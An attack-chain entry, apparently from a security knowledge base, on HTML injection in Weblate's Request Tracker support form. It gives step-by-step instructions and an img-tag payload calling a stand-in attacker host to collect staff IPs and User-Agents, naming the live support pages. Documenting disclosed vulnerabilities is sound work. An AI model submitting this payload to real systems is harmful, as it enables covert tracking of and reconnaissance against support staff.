---
id: ac-weblate-html-injection-disclosure
tags:
  - html-injection
  - information-disclosure
  - weblate
  - request-tracker
type: attack_chain
tools:
  - '[[tools/Request-Tracker]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-HTML-Payload-into-Weblate-Support-Form]]'
  - '[[procedures/Capture-Exfiltrated-Admin-Data-via-Image-Requests]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T17:25:12.652Z'
description: >-
  A multi-stage attack exploiting HTML injection in Weblate's Request Tracker
  support system to inject an img tag payload, which executes when admins view
  tickets, disclosing their internal IPs and User-Agents via requests to an
  attacker-controlled server.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
---
# HTML Injection in Weblate Support Form Leading to Admin IP and User-Agent Disclosure

Multi-stage attack chain demonstrating exploitation of an HTML injection vulnerability in Weblate's support system powered by Request Tracker (RT). The attack involves submitting a malicious img tag payload in support form fields on weblate.org and hosted.weblate.org. When support staff view the ticket via the panel or email notifications, the payload loads the image from the attacker's server, exfiltrating their internal IP addresses and User-Agent strings.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Submit Malicious Payload] --> B[Admin Views Ticket]
    B --> C[Exfiltrate IP and User-Agent]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Attacker-controlled web server (e.g., to host the tracking image endpoint)
- [[tools/Request-Tracker]] (target system, vulnerable version)

### Target Environment

- Web platform
- Weblate.org or hosted.weblate.org support forms
- Request Tracker (RT) for ticket management
- No specific ports required; operates over HTTPS

### Initial Access Requirements

- Public access to Weblate support form (no authentication needed)
- Control of an external server to receive exfiltrated data
- No prior credentials or network position required

## Detailed Attack Procedures

### Step 1: Submit Malicious Payload
procedure: [[procedures/Inject-HTML-Payload-into-Weblate-Support-Form]]

**Objective**: Inject an HTML img tag into all fields of the support request form to poison the ticket content.

**Instructions**: Access the support form at weblate.org/support or hosted.weblate.org/support. Fill every field (subject, description, etc.) with the payload `<img src="https://attacker-server.com/track.gif">`. Submit the form to create a ticket. No special tools needed; can be done via browser.

**Expected Output**: Ticket created successfully, with payload embedded in the ticket content.

**Success Indicators**:
- Confirmation email or page indicating ticket submission
- Payload visible in ticket if self-accessible (though typically requires admin view)

### Step 2: Observe Exfiltration
procedure: [[procedures/Capture-Exfiltrated-Admin-Data-via-Image-Requests]]

**Objective**: Monitor the attacker server for incoming requests triggered when admins load the ticket, revealing their IPs and User-Agents.

**Instructions**: Set up a simple HTTP server on your controlled domain to log requests to /track.gif. Wait for support staff to access the ticket via RT panel or email. Requests will hit your server with query params or headers containing victim details.

**Expected Output**: HTTP logs showing requests from internal IPs (e.g., 137.9.65.65) and User-Agents (e.g., Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X)).

**Success Indicators**:
- Incoming GET requests to the img endpoint
- Logs containing non-public IPs and browser details indicating admin access

## Attack Chain Summary

### Key Achievements

1. Successful HTML injection into unauthenticated support form
2. Execution of payload in admin contexts (panel or email)
3. Disclosure of sensitive admin network and browser information

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[System Information Discovery]] System Information Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
